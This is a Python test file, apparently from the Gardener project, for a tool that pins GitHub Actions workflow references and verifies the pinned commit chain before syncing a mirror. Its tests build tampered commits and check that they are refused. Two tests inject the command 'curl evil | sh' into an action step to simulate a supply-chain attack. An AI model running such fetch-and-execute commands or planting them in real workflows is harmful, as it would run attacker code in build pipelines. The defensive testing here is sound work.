# SPDX-FileCopyrightText: Contributors to the Gardener project
#
# SPDX-License-Identifier: Apache-2.0

import os
import sys

import git
import pytest

sys.path.insert(
    0,
    os.path.abspath(
        os.path.join(os.path.dirname(__file__), '..', '..', '..', '.github', 'actions',
                     'pin-actions-and-workflows')
    ),
)

import pin
import sync_mirror


_ORG = 'myorg'
_REPO = 'myrepo'

_WORKFLOW = '''\
name: Build
on: push
jobs:
  build:
    uses: myorg/myrepo/.github/workflows/reusable.yaml@master
'''
_REUSABLE = '''\
name: Reusable
on: workflow_call
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: myorg/myrepo/.github/actions/foo@master
      - uses: actions/checkout@v6
'''
_ACTION = '''\
name: Foo
runs:
  using: composite
  steps:
    - shell: bash
      run: echo foo
'''


def _write(repo: git.Repo, files: dict[str, str]):
    for path, content in files.items():
        abs_path = os.path.join(repo.working_tree_dir, path)
        os.makedirs(os.path.dirname(abs_path), exist_ok=True)
        with open(abs_path, 'w') as f:
            f.write(content)
        repo.index.add([path])


def _commit(repo: git.Repo, files: dict[str, str], message: str) -> git.Commit:
    _write(repo, files)
    return repo.index.commit(message)


@pytest.fixture
def repo(tmp_path):
    repo = git.Repo.init(tmp_path, initial_branch='master')
    with repo.config_writer() as cfg:
        cfg.set_value('user', 'name', 'test')
        cfg.set_value('user', 'email', 'test@example.com')
        cfg.set_value('commit', 'gpgsign', 'false')
    _commit(
        repo,
        {
            'VERSION': '1.0.0-dev\n',
            '.github/workflows/build.yaml': _WORKFLOW,
            '.github/workflows/reusable.yaml': _REUSABLE,
            '.github/actions/foo/action.yaml': _ACTION,
        },
        'initial',
    )
    return repo


def _pin(repo: git.Repo, own_ref: str = 'master', bundle_dir: str | None = None) -> git.Commit:
    pin.create_pinned_branch(
        repo_root=repo.working_tree_dir,
        own_ref=own_ref,
        target_branch='v1',
        own_org=_ORG,
        own_repo=_REPO,
        bundle_dir=bundle_dir,
    )
    return repo.commit('v1')


def _verify(repo: git.Repo, own: git.Commit, tip: git.Commit):
    sync_mirror.verify_pinned_chain(
        repo=repo,
        own_commit=own,
        tip=tip,
        own_org=_ORG,
        own_repo=_REPO,
    )


def _append_commit(repo, parent, files, message):
    repo.git.checkout('--detach', parent.hexsha)
    return _commit(repo, files, message)


def test_chain_created_by_pin_is_accepted(repo, tmp_path_factory):
    bundle_dir = tmp_path_factory.mktemp('bundle')
    os.makedirs(bundle_dir / 'gardener_gha_libs')
    (bundle_dir / 'gardener_gha_libs' / 'setup.py').write_text('# setup\n')

    tip = _pin(repo, bundle_dir=str(bundle_dir))

    assert tip != repo.commit('master')
    _verify(repo, repo.commit('master'), tip)


def test_extra_commit_on_top_is_refused(repo):
    own = repo.commit('master')
    tip = _pin(repo)
    evil = _append_commit(
        repo,
        tip,
        {'.github/actions/foo/action.yaml': _ACTION.replace('echo foo', 'curl evil | sh')},
        f'pin: rewrite references in .github/actions/foo/action.yaml\n\nown-commit: {own.hexsha}',
    )
    with pytest.raises(sync_mirror.VerificationError, match='unexpected line'):
        _verify(repo, own, evil)


def test_pin_to_foreign_commit_is_refused(repo):
    own = repo.commit('master')
    tip = _pin(repo)
    repo.git.checkout('-b', 'evil', own.hexsha)
    foreign = _commit(repo, {'.github/actions/foo/action.yaml': 'evil\n'}, 'evil')
    pinned = repo.git.show(f'{tip.hexsha}:.github/workflows/build.yaml')
    evil = _append_commit(
        repo,
        tip,
        {'.github/workflows/build.yaml': pinned.replace(
            pinned.split('@')[-1].split()[0], foreign.hexsha,
        ) + '\n'},
        f'pin: rewrite references in .github/workflows/build.yaml\n\nown-commit: {own.hexsha}',
    )
    with pytest.raises(sync_mirror.VerificationError, match='not part of'):
        _verify(repo, own, evil)


def test_commit_without_own_commit_reference_is_refused(repo):
    own = repo.commit('master')
    tip = _pin(repo)
    evil = _append_commit(repo, tip, {'README': 'hi\n'}, 'unrelated')
    with pytest.raises(sync_mirror.VerificationError, match='does not reference own commit'):
        _verify(repo, own, evil)


def test_bundle_commit_changing_existing_files_is_refused(repo):
    own = repo.commit('master')
    tip = _pin(repo)
    evil = _append_commit(
        repo,
        tip,
        {'.github/actions/install-gardener-gha-libs/_bundle/x.py': 'evil\n'},
        f'pin: bundle\n\nown-commit: {own.hexsha}',
    )
    # adding files to bundle dir is accepted (bundle contents cannot be verified) ...
    _verify(repo, own, evil)
    # ... but modifying files outside of it in the same commit is not
    evil = _append_commit(
        repo,
        tip,
        {
            '.github/actions/install-gardener-gha-libs/_bundle/x.py': 'evil\n',
            '.github/actions/foo/action.yaml': 'evil\n',
        },
        f'pin: bundle\n\nown-commit: {own.hexsha}',
    )
    with pytest.raises(sync_mirror.VerificationError, match='adds, removes, or renames'):
        _verify(repo, own, evil)


def test_tip_not_descending_from_own_commit_is_refused(repo):
    own = repo.commit('master')
    _pin(repo)
    repo.git.checkout('--orphan', 'orphan')
    orphan = _commit(repo, {'README': 'orphan\n'}, f'x\n\nown-commit: {own.hexsha}')
    with pytest.raises(sync_mirror.VerificationError, match='0 parents'):
        _verify(repo, own, orphan)


def _fetch_as_source(repo: git.Repo):
    # emulate sync_mirror's fetch into source-namespace from the repository itself
    repo.git.fetch(
        repo.working_tree_dir,
        f'+refs/heads/v1:{sync_mirror._SOURCE_NS}/heads/v1',
        f'+refs/heads/master:{sync_mirror._SOURCE_NS}/heads/master',
        f'+refs/tags/fixated/*:{sync_mirror._SOURCE_NS}/tags/fixated/*',
    )


def test_verify_source_accepts_pinned_master(repo):
    tip = _pin(repo)
    _fetch_as_source(repo)

    verified_tip, own_digest = sync_mirror.verify_source(
        repo=repo,
        target_branch='v1',
        allowed_base='master',
        own_org=_ORG,
        own_repo=_REPO,
    )

    assert verified_tip == tip
    assert own_digest == repo.commit('master').hexsha


def test_verify_source_refuses_unreviewed_own_commit(repo):
    repo.git.checkout('-b', 'feature')
    _commit(
        repo,
        {'.github/actions/foo/action.yaml': _ACTION.replace('echo foo', 'curl evil | sh')},
        'unreviewed',
    )
    _pin(repo, own_ref='feature')
    _fetch_as_source(repo)

    with pytest.raises(sync_mirror.VerificationError, match='reachable'):
        sync_mirror.verify_source(
            repo=repo,
            target_branch='v1',
            allowed_base='master',
            own_org=_ORG,
            own_repo=_REPO,
        )


def test_verify_source_refuses_moved_branch(repo):
    tip = _pin(repo)
    own = repo.commit('master')
    # target branch moved (e.g. force-pushed), preservation ref unchanged
    moved = _append_commit(repo, tip, {'README': 'x\n'}, f'x\n\nown-commit: {own.hexsha}')
    repo.git.update_ref('refs/heads/v1', moved.hexsha)
    _fetch_as_source(repo)

    with pytest.raises(sync_mirror.VerificationError, match='preservation ref'):
        sync_mirror.verify_source(
            repo=repo,
            target_branch='v1',
            allowed_base='master',
            own_org=_ORG,
            own_repo=_REPO,
        )


def test_sync_mirror_pushes_branch_and_tag(repo, tmp_path_factory):
    tip = _pin(repo)
    own_digest = repo.commit('master').hexsha
    mirror_path = tmp_path_factory.mktemp('mirror')
    git.Repo.init(mirror_path, bare=True)

    sync_mirror.sync_mirror(
        repo=repo,
        mirror=str(mirror_path),
        tip=tip,
        own_digest=own_digest,
        target_branch='v1',
        backfill_fixated_tags=False,
        dry_run=False,
    )

    mirror = git.Repo(mirror_path)
    assert mirror.commit('refs/heads/v1') == tip
    assert mirror.commit(f'refs/tags/fixated/{own_digest}') == tip


def test_sync_mirror_refuses_conflicting_fixated_tag(repo, tmp_path_factory):
    tip = _pin(repo)
    own_digest = repo.commit('master').hexsha
    mirror_path = tmp_path_factory.mktemp('mirror')
    git.Repo.init(mirror_path, bare=True)
    repo.git.push(str(mirror_path), f'{own_digest}:refs/tags/fixated/{own_digest}')

    with pytest.raises(sync_mirror.VerificationError, match='expected'):
        sync_mirror.sync_mirror(
            repo=repo,
            mirror=str(mirror_path),
            tip=tip,
            own_digest=own_digest,
            target_branch='v1',
            backfill_fixated_tags=False,
            dry_run=False,
        )
